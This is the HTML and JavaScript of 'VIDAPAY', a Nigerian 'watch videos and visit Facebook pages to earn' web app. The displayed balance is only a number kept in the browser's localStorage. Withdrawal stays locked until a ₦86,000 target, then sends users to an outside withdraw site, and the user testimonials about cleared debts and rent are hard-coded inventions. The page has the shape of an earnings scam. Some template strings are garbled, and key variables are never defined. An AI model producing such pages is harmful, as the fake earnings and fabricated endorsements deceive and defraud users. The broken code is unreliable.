  <meta name="theme-color" content="#b91c1c">

    body { font-family: 'Inter', sans-serif; font-size: 0.85rem; }
    .gradient-bg { background: linear-gradient(135deg, #0a0a0a 0%, #1a1a1a 100%); }
    .balance-text { font-size: 2.1rem; font-weight: 900; letter-spacing: -1px; }
    .neon-glow { text-shadow: 0 0 15px rgb(239 68 68); }
    video { width: 100%; border-radius: 14px; background: #000; }
  </style>
</head>
<body class="bg-zinc-950 text-white min-h-screen gradient-bg">

  <!-- DASHBOARD -->
  <div id="dashboard" class="min-h-screen pb-12">
    <nav class="bg-zinc-900 px-5 py-4 flex justify-between items-center border-b border-zinc-800">
      <div class="flex items-center gap-2">
        <div class="w-8 h-8 bg-red-600 rounded-2xl flex items-center justify-center">
          <i class="fa-solid fa-coins text-white text-xl"></i>
        </div>
        <h1 class="font-black text-xl tracking-tighter">VIDAPAY</h1>
      </div>
      <button onclick="logout()" class="text-zinc-400"><i class="fa-solid fa-right-from-bracket"></i></button>
    </nav>

    <div class="p-5 max-w-md mx-auto">
      <h2 id="welcome-name" class="text-2xl font-bold">Welcome back</h2>

      <div class="mt-6 bg-gradient-to-br from-zinc-900 to-zinc-800 border border-red-500/30 rounded-3xl p-6">
        <div class="flex justify-between items-start">
          <div>
            <p class="uppercase text-xs tracking-widest text-zinc-400">TOTAL BALANCE</p>
            <div class="flex items-baseline mt-2">
              <span class="text-3xl font-black text-red-500">₦</span>
              <span id="balance" class="balance-text neon-glow ml-1">0</span>
            </div>
          </div>
          <button onclick="toggleBalanceVisibility()" class="mt-1">
            <i class="fa-solid fa-eye text-xl text-zinc-400" id="eye-icon"></i>
          </button>
        </div>

        <div class="mt-4">
          <div class="flex justify-between text-xs text-zinc-400 mb-1">
            <span>Progress to ₦86,000</span>
            <span id="progress-text">0%</span>
          </div>
          <div class="h-2 bg-zinc-700 rounded-full overflow-hidden">
            <div id="progress-bar" class="h-2 bg-red-600 rounded-full transition-all" style="width: 0%"></div>
          </div>
        </div>

        <div class="grid grid-cols-2 gap-3 mt-6">
          <button onclick="openTasksModal()" class="py-5 bg-red-600 rounded-2xl font-bold flex items-center justify-center gap-2 hover:bg-red-500 text-white">
            <i class="fa-solid fa-play"></i> Watch Videos
          </button>
          <button onclick="openVisitModal()" class="py-5 bg-red-600 rounded-2xl font-bold flex items-center justify-center gap-2 hover:bg-red-500 text-white">
            <i class="fa-solid fa-globe"></i> Visit Pages
          </button>
        </div>

        <button onclick="attemptWithdraw()" id="withdraw-btn"
                class="mt-4 w-full bg-red-600 py-5 rounded-2xl font-bold flex items-center justify-center gap-2 hover:bg-red-500 text-white">
          <i class="fa-solid fa-money-bill-wave"></i> WITHDRAW
        </button>
      </div>

      <div class="mt-8">
        <h3 class="font-bold text-lg mb-4">What Users Say</h3>
        <div id="app-comments" class="space-y-4"></div>
      </div>
    </div>
  </div>

  <!-- VIDEO TASKS MODAL -->
  <div id="tasks-modal" class="hidden fixed inset-0 bg-black/90 flex items-center justify-center z-50 p-4">
    <div class="bg-zinc-900 rounded-3xl max-w-lg w-full p-6">
      <div class="flex justify-between mb-4">
        <h3 class="font-bold text-xl">Earn Live - Watch & Earn</h3>
        <button onclick="closeTasksModal()" class="text-2xl text-zinc-400">✕</button>
      </div>
      <video id="task-video" controls class="w-full rounded-2xl" onended="videoEnded()"></video>
      <div id="task-info" class="text-center text-sm text-zinc-400 mt-3"></div>
      <div class="flex gap-3 mt-6">
        <button onclick="closeTasksModal()" class="flex-1 py-4 border border-zinc-600 rounded-2xl">CLOSE</button>
        <button onclick="nextVideo()" id="next-btn" class="flex-1 py-4 bg-red-600 text-white font-bold rounded-2xl hidden">NEXT VIDEO</button>
      </div>
    </div>
  </div>

  <!-- VISIT PAGES MODAL -->
  <div id="visit-modal" class="hidden fixed inset-0 bg-black/90 flex items-center justify-center z-50 p-4">
    <div class="bg-zinc-900 rounded-3xl max-w-lg w-full p-6 max-h-[85vh] flex flex-col">
      <div class="flex justify-between mb-4">
        <h3 class="font-bold text-xl">Visit Pages & Earn ₦2,000</h3>
        <button onclick="closeVisitModal()" class="text-2xl text-zinc-400">✕</button>
      </div>
      <p class="text-zinc-400 text-sm mb-4">Open link and stay for at least 10 seconds</p>
      <div id="pages-list" class="flex-1 overflow-auto space-y-3"></div>
    </div>
  </div>

    const fbPages = [
      { id: 1, name: "Viva Cosmetics", url: "https://www.facebook.com/VivaCosmetics", desc: "Premium Cosmetics" },
      { id: 2, name: "Tejuosho Shopping Centre", url: "https://www.facebook.com/Tejuoshoshoppingcentre", desc: "Shopping & Wholesale" },

      { id: 10, name: "Business Motivation", url: "https://youtube.com", desc: "Motivational Content" }
    ];

    const appComments = [
      { name: "Aisha Bello", comment: "VIDAPAY paid my debt within 2 weeks. The videos are easy and payout is fast!" },
      { name: "Chinedu Okoro", comment: "I earned ₦86,000 just by watching videos and liking pages. Best earning app!" },
      { name: "Fatima Yusuf", comment: "The system really pays. I cleared my rent with the money I made here." }
    ];

    function saveBalance() {
      localStorage.setItem('vidapay_balance', balance);
    }

    function loadBalance() {
      const saved = localStorage.getItem('vidapay_balance');
      balance = saved ? parseInt(saved) : 0;
    }

    function updateBalanceDisplay() {
      document.getElementById('balance').textContent = balance.toLocaleString('en-NG');
      const perc = Math.min((balance / MAX_BALANCE) * 100, 100);
      document.getElementById('progress-bar').style.width = `${perc}%`;
      document.getElementById('progress-text').textContent = `${Math.round(perc)}%`;
    }

    function attemptWithdraw() {
      if (balance >= MAX_BALANCE) {
        window.open('https://ofunds-withdraw.vercel.app/', '_blank');
      } else {
        const remaining = MAX_BALANCE - balance;
        alert(`❌ Withdrawal locked!\n\nYou need ₦${remaining.toLocaleString()} more to unlock withdrawal.\n\nKeep earning!`);
      }
    }

    function openTasksModal() {
      currentVideoIndex = 0;
      document.getElementById('tasks-modal').classList.remove('hidden');
      playCurrentVideo();
    }

    function closeTasksModal() {
      document.getElementById('tasks-modal').classList.add('hidden');
      const vid = document.getElementById('task-video');
      if (vid) vid.pause();
    }

    function playCurrentVideo() {
      const videoEl = document.getElementById('task-video');
      const info = document.getElementById('task-info');
      const nextBtn = document.getElementById('next-btn');

      const current = videos[currentVideoIndex % videos.length];
      videoEl.src = current.src;
      info.innerHTML = `<strong>Video \( {currentVideoIndex + 1}/ \){videos.length}</strong><br>${current.title}<br><span class="text-emerald-400">Watch full to earn ₦2,000</span>`;
      nextBtn.classList.add('hidden');
      videoEl.load();
      videoEl.play().catch(() => {});
    }

    function videoEnded() {
      document.getElementById('next-btn').classList.remove('hidden');
      if (balance < MAX_BALANCE) {
        balance += 2000;
        updateBalanceDisplay();
        saveBalance();
      }
    }

    function nextVideo() {
      currentVideoIndex++;
      playCurrentVideo();
    }

    function openVisitModal() {
      document.getElementById('visit-modal').classList.remove('hidden');
      renderVisitList();
    }

    function closeVisitModal() {
      document.getElementById('visit-modal').classList.add('hidden');
    }

    function renderVisitList() {
      const container = document.getElementById('pages-list');
      container.innerHTML = '';

      fbPages.forEach(item => {
        const card = document.createElement('div');
        card.className = "bg-zinc-800 p-5 rounded-3xl";
        card.innerHTML = `
          <h4 class="font-semibold">${item.name}</h4>
          <p class="text-xs text-zinc-400 mt-1">${item.desc}</p>
          <button onclick="startVisit(\( {item.id})" id="btn- \){item.id}" 
                  class="mt-4 w-full bg-red-600 text-white py-3 rounded-2xl font-bold">
            OPEN PAGE (Stay 10s)
          </button>
        `;
        container.appendChild(card);
      });
    }

    function startVisit(id) {
      const item = fbPages.find(x => x.id === id);
      window.open(item.url, '_blank');

      const btn = document.getElementById(`btn-${id}`);
      btn.disabled = true;
      btn.textContent = "⏳ Waiting 10 seconds...";

      setTimeout(() => {
        btn.textContent = "✅ Claim ₦2,000";
        btn.onclick = () => completeVisit(id);
        btn.disabled = false;
      }, 10000);
    }

    function completeVisit(id) {
      if (balance < MAX_BALANCE) {
        balance += 2000;
        updateBalanceDisplay();
        saveBalance();
        alert("✅ ₦2,000 added successfully!");
      }
    }

    function toggleBalanceVisibility() {
      isVisible = !isVisible;
      const bal = document.getElementById('balance');
      const icon = document.getElementById('eye-icon');
      if (!isVisible) {
        bal.textContent = "••••••";
        icon.classList.replace('fa-eye', 'fa-eye-slash');
      } else {
        updateBalanceDisplay();
        icon.classList.replace('fa-eye-slash', 'fa-eye');
      }
    }

    function logout() {
      if (confirm("Logout?")) {
        saveBalance();
        location.reload();
      }
    }

    function renderAppComments() {
      const container = document.getElementById('app-comments');
      container.innerHTML = '';
      appComments.forEach(c => {
        const div = document.createElement('div');
        div.className = "bg-zinc-900 border border-zinc-700 rounded-3xl p-5";
        div.innerHTML = `<p class="italic">"${c.comment}"</p><p class="text-red-400 text-sm mt-3">- ${c.name}</p>`;
        container.appendChild(div);
      });
    }

    window.onload = () => {
      loadBalance();
      document.getElementById('welcome-name').textContent = `Welcome, ${currentUser.firstname}`;
      updateBalanceDisplay();
      renderAppComments();
    };
  </script>

</html>
